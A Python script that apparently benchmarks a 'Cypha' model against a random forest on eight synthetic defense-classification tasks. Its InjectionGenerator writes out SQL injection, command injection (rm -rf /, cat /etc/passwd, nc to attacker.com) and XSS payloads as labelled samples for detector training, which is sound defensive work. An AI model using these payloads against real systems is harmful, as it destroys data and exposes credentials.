"""
Cypha HRNA Defense Benchmarking Suite
8 Defense-Relevant Tasks vs Random Forest Baseline

Trains SEPARATELY per task for accuracy (no cross-contamination)
No API costs - all datasets generated synthetically
Runtime: ~15-20 minutes

Requirements: pip install scikit-learn numpy
"""

import numpy as np
import time
import json
from typing import List, Tuple
from dataclasses import dataclass

@dataclass
class BenchmarkResult:
    task: str
    method: str
    accuracy: float
    precision: float
    recall: float
    f1: float
    inference_time_ms: float
    training_time_s: float
    samples_tested: int


class SignalGenerator:
    """RF/Acoustic signal classification"""
    
    @staticmethod
    def generate_signal(signal_type: str, length: int = 256) -> np.ndarray:
        t = np.linspace(0, 1, length)
        noise = 0.1
        
        if signal_type == "radar_chirp":
            chirp = np.sin(2*np.pi*(5*t + 22.5*t**2))
            return chirp + noise * np.random.randn(length)
        elif signal_type == "comms_qpsk":
            symbols = np.random.choice([1+1j, 1-1j, -1+1j, -1-1j], size=length//4)
            return np.real(np.repeat(symbols, 4)) + noise * np.random.randn(length)
        elif signal_type == "jamming":
            return 2*np.random.randn(length)
        elif signal_type == "machinery":
            sig = np.sin(2*np.pi*20*t) + 0.3*np.sin(2*np.pi*40*t)
            return sig + noise * np.random.randn(length)
        else:  # human voice
            sig = np.sin(2*np.pi*200*t) + 0.5*np.sin(2*np.pi*400*t)
            return sig + noise * np.random.randn(length)
    
    @staticmethod
    def generate_dataset(n_per_class: int = 120):
        classes = ["radar_chirp", "comms_qpsk", "jamming", "machinery", "human_voice"]
        train_data, test_data = [], []
        
        for cls in classes:
            for _ in range(n_per_class):
                sig = SignalGenerator.generate_signal(cls)
                train_data.append(("hex:" + sig.astype(np.float32).tobytes().hex(), cls))
            for _ in range(n_per_class // 5):
                sig = SignalGenerator.generate_signal(cls)
                test_data.append(("hex:" + sig.astype(np.float32).tobytes().hex(), cls))
        
        return train_data, test_data


class AnomalyGenerator:
    """Network intrusion detection"""
    
    @staticmethod
    def generate_normal() -> str:
        return json.dumps({
            'pkt_size': float(np.random.normal(512, 100)),
            'pkt_rate': float(np.random.normal(10, 2)),
            'port': int(np.random.choice([80, 443, 8080])),
            'duration': float(np.random.exponential(5)),
            'bytes_sent': float(np.random.normal(2048, 500))
        })
    
    @staticmethod
    def generate_anomaly(atype: str) -> str:
        if atype == "port_scan":
            data = {'pkt_size': 64, 'pkt_rate': 1000, 'port': int(np.random.randint(1, 65535)), 
                   'duration': 0.5, 'bytes_sent': 128}
        elif atype == "ddos":
            data = {'pkt_size': 1500, 'pkt_rate': 5000, 'port': 80, 
                   'duration': 0.3, 'bytes_sent': 50000}
        else:  # data_exfil
            data = {'pkt_size': 1400, 'pkt_rate': 50, 'port': 443, 
                   'duration': 300, 'bytes_sent': 100000}
        return json.dumps(data)
    
    @staticmethod
    def generate_dataset(n_normal: int = 250, n_anom: int = 40):
        train_data, test_data = [], []
        
        for _ in range(int(n_normal * 0.8)):
            train_data.append((AnomalyGenerator.generate_normal(), "normal"))
        for _ in range(int(n_normal * 0.2)):
            test_data.append((AnomalyGenerator.generate_normal(), "normal"))
        
        for atype in ["port_scan", "ddos", "data_exfil"]:
            for _ in range(int(n_anom * 0.8)):
                train_data.append((AnomalyGenerator.generate_anomaly(atype), "anomaly"))
            for _ in range(int(n_anom * 0.2)):
                test_data.append((AnomalyGenerator.generate_anomaly(atype), "anomaly"))
        
        np.random.shuffle(train_data)
        np.random.shuffle(test_data)
        return train_data, test_data


class ThreatGenerator:
    """Malware behavioral classification"""
    
    @staticmethod
    def generate_benign() -> str:
        ops = ["file_read", "file_write", "network_http", "process_create", "registry_read"]
        return " ".join(np.random.choice(ops, size=np.random.randint(5, 15)))
    
    @staticmethod
    def generate_malware(mtype: str) -> str:
        if mtype == "ransomware":
            ops = ["file_read", "file_write", "file_delete"] * 30
            ops += ["network_tor", "crypto_key_gen"]
        elif mtype == "trojan":
            ops = ["process_inject", "registry_write", "network_https"] * 8
            ops += ["file_download", "process_create"]
        else:  # worm
            ops = ["network_scan", "network_connect"] * 15
            ops += ["file_copy", "process_create"]
        np.random.shuffle(ops)
        return " ".join(ops[:30])
    
    @staticmethod
    def generate_dataset(n_per_class: int = 120):
        classes = ["benign", "ransomware", "trojan", "worm"]
        train_data, test_data = [], []
        
        for cls in classes:
            gen = ThreatGenerator.generate_benign if cls == "benign" else lambda: ThreatGenerator.generate_malware(cls)
            for _ in range(int(n_per_class * 0.8)):
                train_data.append((gen(), cls))
            for _ in range(int(n_per_class * 0.2)):
                test_data.append((gen(), cls))
        
        np.random.shuffle(train_data)
        np.random.shuffle(test_data)
        return train_data, test_data


class PatternGenerator:
    """Pattern detection in encrypted/noisy data"""
    
    @staticmethod
    def generate_noise() -> bytes:
        return np.random.bytes(128)
    
    @staticmethod
    def generate_pattern(ptype: str) -> bytes:
        data = np.random.randint(0, 256, 128, dtype=np.uint8)
        if ptype == "periodic":
            for i in range(0, 128, 16):
                data[i:i+4] = [0xDE, 0xAD, 0xBE, 0xEF]
        elif ptype == "header":
            data[:8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
        else:  # checksum
            data[32] = int(sum(int(x) for x in data[:32])) % 256
            data[64] = int(sum(int(x) for x in data[33:64])) % 256
        return data.tobytes()
    
    @staticmethod
    def generate_dataset(n_per_class: int = 180):
        classes = ["noise", "periodic", "header", "checksum"]
        train_data, test_data = [], []
        
        for cls in classes:
            gen = PatternGenerator.generate_noise if cls == "noise" else lambda: PatternGenerator.generate_pattern(cls)
            for _ in range(int(n_per_class * 0.8)):
                train_data.append(("hex:" + gen().hex(), cls))
            for _ in range(int(n_per_class * 0.2)):
                test_data.append(("hex:" + gen().hex(), cls))
        
        np.random.shuffle(train_data)
        np.random.shuffle(test_data)
        return train_data, test_data


class VehicleGenerator:
    """Military vehicle recognition (8x8 silhouettes)"""
    
    @staticmethod
    def generate_vehicle(vtype: str) -> np.ndarray:
        grid = np.zeros((8, 8), dtype=np.float32)
        
        if vtype == "tank":
            grid[3:6, 1:7] = 1.0; grid[2:4, 3:5] = 1.0; grid[6, :] = 1.0
        elif vtype == "apc":
            grid[2:6, 1:7] = 1.0; grid[1:3, 2:6] = 1.0; grid[6, :] = 1.0
        elif vtype == "truck":
            grid[3:6, 4:7] = 1.0; grid[3:6, 0:4] = 1.0; grid[6, 1:7] = 1.0
        elif vtype == "helicopter":
            grid[3:5, :] = 1.0; grid[2:6, 3:5] = 1.0; grid[4, 6:8] = 1.0
        else:  # jet
            grid[3:5, 2:6] = 1.0; grid[2:6, 3:5] = 1.0; grid[4, 0:2] = 1.0
        
        return np.clip(grid + np.random.rand(8, 8)*0.1, 0, 1)
    
    @staticmethod
    def generate_dataset(n_per_class: int = 100):
        classes = ["tank", "apc", "truck", "helicopter", "jet"]
        train_data, test_data = [], []
        
        for cls in classes:
            for _ in range(n_per_class):
                grid = VehicleGenerator.generate_vehicle(cls)
                train_data.append(("arr:" + grid.tobytes().hex(), cls))
            for _ in range(n_per_class // 5):
                grid = VehicleGenerator.generate_vehicle(cls)
                test_data.append(("arr:" + grid.tobytes().hex(), cls))
        
        return train_data, test_data


class SensorGenerator:
    """Equipment sensor anomaly detection"""
    
    @staticmethod
    def generate_normal() -> str:
        t = np.linspace(0, 10, 50)
        temp = 70 + 5*np.sin(0.5*t) + np.random.randn(50)*0.5
        vib = 0.1 + 0.05*np.sin(2*t) + np.random.randn(50)*0.02
        psi = 100 + 10*np.sin(0.3*t) + np.random.randn(50)
        return f"temp:{','.join(f'{x:.2f}' for x in temp)} vib:{','.join(f'{x:.3f}' for x in vib)} psi:{','.join(f'{x:.1f}' for x in psi)}"
    
    @staticmethod
    def generate_anomaly(atype: str) -> str:
        t = np.linspace(0, 10, 50)
        if atype == "overheat":
            temp = 70 + np.linspace(0, 50, 50) + np.random.randn(50)*2
            vib = 0.1 + 0.05*np.sin(2*t) + np.random.randn(50)*0.02
            psi = 100 + 10*np.sin(0.3*t) + np.random.randn(50)
        elif atype == "bearing":
            temp = 70 + 5*np.sin(0.5*t) + np.random.randn(50)*0.5
            vib = 0.1 + np.linspace(0, 2, 50) + np.random.randn(50)*0.2
            psi = 100 + 10*np.sin(0.3*t) + np.random.randn(50)
        else:  # pressure
            temp = 70 + 5*np.sin(0.5*t) + np.random.randn(50)*0.5
            vib = 0.1 + 0.05*np.sin(2*t) + np.random.randn(50)*0.02
            psi = 100 - np.linspace(0, 40, 50) + np.random.randn(50)*2
        return f"temp:{','.join(f'{x:.2f}' for x in temp)} vib:{','.join(f'{x:.3f}' for x in vib)} psi:{','.join(f'{x:.1f}' for x in psi)}"
    
    @staticmethod
    def generate_dataset(n_normal: int = 200, n_anom: int = 40):
        train_data, test_data = [], []
        
        for _ in range(int(n_normal * 0.8)):
            train_data.append((SensorGenerator.generate_normal(), "normal"))
        for _ in range(int(n_normal * 0.2)):
            test_data.append((SensorGenerator.generate_normal(), "normal"))
        
        for atype in ["overheat", "bearing", "pressure"]:
            for _ in range(int(n_anom * 0.8)):
                train_data.append((SensorGenerator.generate_anomaly(atype), "anomaly"))
            for _ in range(int(n_anom * 0.2)):
                test_data.append((SensorGenerator.generate_anomaly(atype), "anomaly"))
        
        np.random.shuffle(train_data)
        np.random.shuffle(test_data)
        return train_data, test_data


class InjectionGenerator:
    """SQL/Command injection detection"""
    
    @staticmethod
    def generate_safe() -> str:
        queries = [
            "SELECT * FROM users WHERE id = 123",
            "UPDATE products SET price = 29.99 WHERE sku = 'ABC'",
            "INSERT INTO orders VALUES (456, 99.99)",
            "DELETE FROM sessions WHERE expired = true"
        ]
        return np.random.choice(queries)
    
    @staticmethod
    def generate_injection(itype: str) -> str:
        if itype == "sql":
            return np.random.choice([
                "SELECT * FROM users WHERE id = 1' OR '1'='1",
                "UPDATE products SET price = 0 WHERE sku = 'ABC'; DROP TABLE products;--",
                "SELECT * FROM users WHERE name = 'admin'--"
            ])
        elif itype == "command":
            return np.random.choice([
                "file.txt; rm -rf /",
                "input & cat /etc/passwd",
                "term | nc attacker.com 1234"
            ])
        else:  # xss
            return np.random.choice([
                "<script>alert('XSS')</script>",
                "' onerror='alert(1)'",
                "<img src=x onerror=fetch('evil.com')>"
            ])
    
    @staticmethod
    def generate_dataset(n_per_class: int = 120):
        classes = ["safe", "sql", "command", "xss"]
        train_data, test_data = [], []
        
        for cls in classes:
            gen = InjectionGenerator.generate_safe if cls == "safe" else lambda: InjectionGenerator.generate_injection(cls)
            for _ in range(int(n_per_class * 0.8)):
                train_data.append((gen(), cls))
            for _ in range(int(n_per_class * 0.2)):
                test_data.append((gen(), cls))
        
        np.random.shuffle(train_data)
        np.random.shuffle(test_data)
        return train_data, test_data


class ProtocolGenerator:
    """Network protocol classification"""
    
    @staticmethod
    def generate_protocol(ptype: str) -> bytes:
        if ptype == "http":
            return b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n" + np.random.bytes(100)
        elif ptype == "ssh":
            return b"SSH-2.0-OpenSSH_8.2\r\n" + np.random.bytes(150)
        elif ptype == "dns":
            return np.random.bytes(12) + b"\x03www\x07example\x03com\x00\x00\x01\x00\x01" + np.random.bytes(30)
        elif ptype == "smtp":
            return b"EHLO mail.example.com\r\n" + np.random.bytes(80)
        else:  # ftp
            return b"USER anonymous\r\nPASS guest@\r\n" + np.random.bytes(60)
    
    @staticmethod
    def generate_dataset(n_per_class: int = 100):
        classes = ["http", "ssh", "dns", "smtp", "ftp"]
        train_data, test_data = [], []
        
        for cls in classes:
            for _ in range(n_per_class):
                train_data.append(("hex:" + ProtocolGenerator.generate_protocol(cls).hex(), cls))
            for _ in range(n_per_class // 5):
                test_data.append(("hex:" + ProtocolGenerator.generate_protocol(cls).hex(), cls))
        
        return train_data, test_data


def generate_report(results, output_file="benchmark_results.md"):
    """Generate markdown report"""
    with open(output_file, 'w') as f:
        f.write("# Cypha HRNA Defense Benchmark Results\n\n")
        f.write(f"**Date**: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        tasks = sorted(list(set(r.task for r in results)))
        
        for task in tasks:
            f.write(f"## {task}\n\n")
            task_results = [r for r in results if r.task == task]
            
            f.write("| Method | Accuracy | Precision | Recall | F1 | Inference (ms) | Training (s) |\n")
            f.write("|--------|----------|-----------|--------|----|--------------|--------------|\n")
            
            for r in sorted(task_results, key=lambda x: -x.accuracy):
                f.write(f"| **{r.method}** | **{r.accuracy*100:.1f}%** | {r.precision:.3f} | {r.recall:.3f} | {r.f1:.3f} | {r.inference_time_ms:.1f} | {r.training_time_s:.1f} |\n")
            
            f.write("\n")
            
            cypha = next((r for r in task_results if "Cypha" in r.method), None)
            if cypha and cypha.accuracy >= max(r.accuracy for r in task_results):
                f.write(f"✅ **Cypha wins** ({cypha.accuracy*100:.1f}%)\n\n")
        
        f.write("---\n\n## Summary\n\n")
        
        cypha_results = [r for r in results if "Cypha" in r.method]
        f.write(f"**Cypha HRNA**: {np.mean([r.accuracy for r in cypha_results])*100:.1f}% avg accuracy, "
               f"{np.mean([r.f1 for r in cypha_results]):.3f} avg F1, "
               f"{np.mean([r.inference_time_ms for r in cypha_results]):.1f}ms avg inference\n\n")
        
        wins = sum(1 for r in cypha_results if r.accuracy >= max(res.accuracy for res in results if res.task == r.task))
        f.write(f"**Wins**: {wins}/{len(cypha_results)} tasks\n")
    
    print(f"\n{'='*60}")
    print(f"  Report saved: {output_file}")
    print(f"{'='*60}")


def main():
    print("="*70)
    print("  CYPHA HRNA DEFENSE BENCHMARKING")
    print("="*70)
    print("\n8 Tasks | 2 Methods | Separate training per task")
    print("Runtime: ~15-20 minutes for accuracy\n")
    
    results = []
    
    tasks = [
        ("Signal Classification", SignalGenerator),
        ("Network Anomaly Detection", AnomalyGenerator),
        ("Malware Classification", ThreatGenerator),
        ("Pattern Detection", PatternGenerator),
        ("Vehicle Recognition", VehicleGenerator),
        ("Sensor Anomaly Detection", SensorGenerator),
        ("Injection Detection", InjectionGenerator),
        ("Protocol Classification", ProtocolGenerator),
    ]
    
    for i, (name, generator) in enumerate(tasks, 1):
        print(f"\n{'='*70}")
        print(f"  TASK {i}/8: {name.upper()}")
        print(f"{'='*70}")
        
        # Generate dataset
        train, test = generator.generate_dataset()
        print(f"Dataset: {len(train)} train, {len(test)} test")
        
        # Save dataset
        with open(name.lower().replace(" ", "_") + "_data.txt", 'w') as f:
            for inp, out in train:
                f.write(f"{inp}|||{out}\n")
        
        # Train and test Cypha on THIS task only
        print(f"\n--- Training Cypha ---")
        
        # Load Cypha classes without running main()
        import sys
        if 'Cypha' not in globals():
            with open('Cypha.py', 'r') as f:
                cypha_code = f.read()
                # Remove the main execution
                if 'if __name__' in cypha_code:
                    cypha_code = cypha_code.split('if __name__')[0]
                exec(cypha_code, globals())
        
        # Create fresh Cypha instance (no prior memory)
        cypha = Cypha(feature_dim=4096, resonance_dim=256)
        
        import time
        t0 = time.time()
        cypha.train(train, epochs=3, verbose=False)
        cypha_train_time = time.time() - t0
        print(f"Trained in {cypha_train_time:.1f}s")
        
        # Test Cypha
        print(f"Testing on {len(test)} examples...")
        correct = 0
        classes = list(set(out for _, out in train))
        class_correct = {c: 0 for c in classes}
        class_total = {c: 0 for c in classes}
        class_predicted = {c: 0 for c in classes}
        inference_times = []
        
        for inp, expected in test:
            t0 = time.time()
            result, conf = cypha.infer(inp, verbose=False)
            inference_times.append((time.time() - t0) * 1000)
            
            class_total[expected] += 1
            if result in class_predicted:
                class_predicted[result] += 1
            else:
                class_predicted[result] = 1
            
            if result == expected:
                correct += 1
                class_correct[expected] += 1
        
        cypha_accuracy = correct / len(test)
        
        # Calculate metrics
        precisions, recalls, f1s = [], [], []
        for cls in classes:
            tp = class_correct[cls]
            fp = class_predicted.get(cls, 0) - tp
            fn = class_total[cls] - tp
            precision = tp / (tp + fp) if (tp + fp) > 0 else 0
            recall = tp / (tp + fn) if (tp + fn) > 0 else 0
            f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0
            precisions.append(precision)
            recalls.append(recall)
            f1s.append(f1)
        
        print(f"✓ Cypha: {cypha_accuracy*100:.1f}% accuracy, {np.mean(f1s):.3f} F1, {np.mean(inference_times):.1f}ms")
        
        results.append(BenchmarkResult(
            task=name, method="Cypha HRNA", accuracy=cypha_accuracy,
            precision=np.mean(precisions), recall=np.mean(recalls), f1=np.mean(f1s),
            inference_time_ms=np.mean(inference_times), training_time_s=cypha_train_time,
            samples_tested=len(test)
        ))
        
        # Train and test Random Forest on THIS task only
        print(f"\n--- Training Random Forest ---")
        from sklearn.ensemble import RandomForestClassifier
        from sklearn.feature_extraction.text import TfidfVectorizer
        from sklearn.metrics import accuracy_score, precision_recall_fscore_support
        
        vectorizer = TfidfVectorizer(max_features=1000, analyzer='char', ngram_range=(1, 3))
        
        X_train = [inp[:2000] for inp, _ in train]
        y_train = [out for _, out in train]
        X_test = [inp[:2000] for inp, _ in test]
        y_test = [out for _, out in test]
        
        X_train_vec = vectorizer.fit_transform(X_train)
        X_test_vec = vectorizer.transform(X_test)
        
        t0 = time.time()
        clf = RandomForestClassifier(n_estimators=100, random_state=42, n_jobs=-1)
        clf.fit(X_train_vec, y_train)
        rf_train_time = time.time() - t0
        print(f"Trained in {rf_train_time:.1f}s")
        
        # Test Random Forest
        print(f"Testing on {len(test)} examples...")
        inference_times = []
        predictions = []
        for i in range(len(X_test)):
            t0 = time.time()
            pred = clf.predict(X_test_vec[i])
            inference_times.append((time.time() - t0) * 1000)
            predictions.append(pred[0])
        
        rf_accuracy = accuracy_score(y_test, predictions)
        precision, recall, f1, _ = precision_recall_fscore_support(y_test, predictions, average='macro', zero_division=0)
        
        print(f"✓ Random Forest: {rf_accuracy*100:.1f}% accuracy, {f1:.3f} F1, {np.mean(inference_times):.1f}ms")
        
        results.append(BenchmarkResult(
            task=name, method="Random Forest", accuracy=rf_accuracy,
            precision=precision, recall=recall, f1=f1,
            inference_time_ms=np.mean(inference_times), training_time_s=rf_train_time,
            samples_tested=len(y_test)
        ))
    
    generate_report(results)
    
    print(f"\n{'='*70}")
    print("  ✅ COMPLETE")
    print(f"{'='*70}")


if __name__ == "__main__":
    main()